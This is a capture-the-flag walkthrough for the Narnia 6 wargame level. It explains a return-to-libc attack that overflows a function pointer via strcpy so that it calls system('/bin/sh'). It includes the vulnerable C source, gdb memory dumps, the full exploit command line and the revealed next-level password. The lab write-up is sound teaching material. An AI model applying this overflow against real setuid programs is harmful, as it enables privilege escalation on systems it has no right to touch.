# **Let's get on this one!**
------------------------------

But first let's read our beautiful code that'll make us suffer for a couple of hours!!
> Here is some help for you!:
[Some informations about registers](https://wiki.skullsecurity.org/index.php?title=Registers)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
    fp(b1);

        exit(1);
}

```
The part that tickles me is the (\*fp), it's basically a pointer to the address of puts, so we somehow have a stack access. Some cleaning process and a copy into b1 and b2, and if our puts AND 0xff000000 = 0xff000000 then exit, else setreuid and fp(our pointer to puts) of b1

Let's run our code first to see how all of this work and maybe we'll have an int!
So we pass 2 char args and we get the first one back...(ntg really surprising) alright so let's dig done in our assembly 
but before let's think about the technique we know and if we can use them: 
	-NOP sled and shellcode: naah i don't have enough space to get all of this in my 8x2 chars, and our env and argv are resetted so we can't use them either
It seems that we can't use the logic we used before: **"being able to exploit the return address"**
And so what's the total opposite of "take advantage of the return", JUST TAKE CONTROL OF THE CALLING!
Ok so let's calm down and explain the logic because it sounds a lil bit crazy!
I do have a \*fp who's able to take control of the puts, and to this puts, if i have the control i can inject what ever i want(at least it has to be on the machine to get executed) 
After a bit of search (bc i was locked lol) i found out that those kind of exploit are called a "ReturnToLibc attack"
here is the definition of Wikipedia who explain it pretty well:
>A "return-to-libc" attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, bypassing the no-execute bit feature (if present) and ridding the attacker of the need to inject their own code. 

So to understand what's happening behind all this i'll just run a gdb, let's just disas main and go around the functions who call fp --> upper we can see strcpy and after some exit, so our command should be around here (flavor your disas as intel bc i don't know how to retranscript this command for att), I can see just before the and a move, from eax to DWORD PTR [ebp-0xc] --> SEEMS LIKE I GOT MY \*FP !!
Could i grab his hex ref from this? Of course you can, let's just run x/wx $ebp-0xc
Basically you just want to were this call from and you got: 0x08048430
And this is our fp address!! How can we override it?

Let's keep it in mind and just run a quick test with run AAAA BBBB
let's use x/12x $esp to see what's happening here and if our data are effetively here
So i found 1, BBBB, a weird hex, AAAA!! and just LOOK WHO'S HERE!!!!
```
0xffffd698:     0x00000001      0x42424242      0xf7fc5300      0x41414141
0xffffd6a8:     0x08048700      0x08048430      0x00000003      0x00000000
0xffffd6b8:     0x00000000      0xf7e2a286      0x00000003      0xffffd754
```
On the 2nd line in 2nd position, that's our looovely fp!
So our fp can be overflowed, but by what?? what i do want is just getting an sh to cat our pwd, but how am i supposed to do that without my shellcode?

__*And here is the trickery!!!*__
I said previously that, this way i can call everything i want, it just has to be on the victim devices! so think about something really useful to call a /bin/sh ..... --> the system of course!
Let's get "system" by printing the value stored in the variable system (of course system is a variable containing an hex data, like everything)

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>

```

LLLLLook at this crispy information we've here!

**Let's recapitulate !**
We do have the way to overflow our fp, the function who would overflow it and that's pretty much all we need!
Let's combine all of this:
-I know that i need 8char to overflow my b1 & b2, let's just do the following so:

```bash
./narnia6 $(python -c 'print "A"*8 + "\x50\xc8\xe4\xf7"') $(python -c 'print "B"*8 + "/bin/sh"')
```

As we so earlier, don't forget that our BBBB (\x42) is stored BEFORE our AAAA (\x41) so to overflow our fp we need to call it on the first arg so he's traited last in the memory!
And like so, we would be able to make him call system /bin/sh !
Let's try it now!

And it does work!! let's just run the same command as always:

```bash
$ cat /etc/narnia_pass/narnia7
```

~~**ahkiaziphu**~~